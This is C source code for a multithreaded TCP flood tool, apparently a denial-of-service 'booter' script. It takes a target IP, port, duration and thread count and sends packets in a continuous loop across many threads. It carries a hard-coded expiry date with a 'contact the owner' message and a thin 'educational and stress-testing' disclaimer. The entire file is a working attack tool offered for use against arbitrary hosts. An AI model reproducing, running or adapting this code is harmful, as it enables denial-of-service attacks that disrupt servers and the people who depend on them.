#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PACKET_SIZE 1024         // Size of each packet in bytes
#define MAX_RETRIES 3            // Max number of retries if attack fails
#define EXPIRY_DATE "2025-03-20" // Expiration date
#define TIMEOUT_SECONDS 5        // Connection timeout in seconds

// Global variables for IP, Port, Duration, and Thread count
char *target_ip = NULL;
int target_port = 0;
int num_threads = 1;
int attack_duration = 60;  // Default attack duration (in seconds)

// Function to check if the current date is past the expiration date
int is_expired() {
    time_t now;
    struct tm expiry_tm = {0};

    // Set the expiry date to March 20, 2025
    expiry_tm.tm_year = 2025 - 1900; // Year since 1900
    expiry_tm.tm_mon = 2;            // Month (0-11)
    expiry_tm.tm_mday = 20;          // Day of the month

    time(&now);
    // Compare current time with expiry time
    return difftime(now, mktime(&expiry_tm)) > 0;
}

// Function to handle the flooding attack
void* flood_attack(void* thread_id) {
    int sock;
    struct sockaddr_in server_addr;
    char data[PACKET_SIZE];
    int retries = 0;
    int success = 0;
    struct timeval timeout;

    while (retries < MAX_RETRIES && !success) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("Socket creation failed");
            retries++;
            continue;  // Retry on failure
        }

        // Set timeout for the socket
        timeout.tv_sec = TIMEOUT_SECONDS;
        timeout.tv_usec = 0;
        if (setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout)) < 0) {
            perror("Failed to set send timeout");
        }
        if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout)) < 0) {
            perror("Failed to set receive timeout");
        }

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target_port);
        server_addr.sin_addr.s_addr = inet_addr(target_ip);

        // Attempt to connect to the target IP and Port
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Connection failed");
            retries++;
            close(sock);
            continue;  // Retry on connection failure
        }

        // Start sending packets
        time_t start_time = time(NULL);
        time_t end_time = start_time + attack_duration;

        while (time(NULL) <= end_time) {
            // Calculate remaining time
            time_t remaining = end_time - time(NULL);
            int minutes = remaining / 60;
            int seconds = remaining % 60;

            printf("Thread %ld: %d minutes %d seconds remaining\n", pthread_self(), minutes, seconds);

            if (send(sock, data, PACKET_SIZE, 0) < 0) {
                perror("Send failed");
                retries++;
                break;  // Break out to retry
            }
        }

        close(sock);
        success = 1; // Success if the attack completed
    }

    if (!success) {
        printf("Attack failed after %d retries\n", retries);
    } else {
        printf("Attack completed successfully\n");
    }
    return NULL;
}

// Function to parse command-line arguments
void parse_arguments(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <IP> <Port> <Duration> <Threads>\n", argv[0]);
        exit(1);
    }

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    attack_duration = atoi(argv[3]);
    num_threads = atoi(argv[4]);

    if (target_port <= 0 || num_threads <= 0 || attack_duration <= 0) {
        printf("Invalid arguments. Please provide valid IP, Port, Duration, and Threads.\n");
        exit(1);
    }
}

// Main function
int main(int argc, char *argv[]) {
    // Print warning and usage information
    printf("WARNING: This tool is for educational and stress-testing purposes only.\n");
    printf("Usage: %s <IP> <Port> <Duration> <Threads>\n", argv[0]);
    printf("Example: %s 192.168.1.1 8080 60 10\n", argv[0]);
    printf("\n");

    // Check for expiration
    if (is_expired()) {
        printf("This script has expired. Please contact the owner.\n");
        exit(1);
    }

    // Parse arguments for IP, Port, Duration, and Threads
    parse_arguments(argc, argv);

    // Thread creation for simultaneous attacks
    pthread_t threads[num_threads];

    // Start the flooding attack in multiple threads
    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, flood_attack, (void*)(long)i) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        printf("Thread %d created successfully\n", i);
    }

    // Wait for all threads to finish
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("All attacks completed successfully.\n");
    return 0;
}
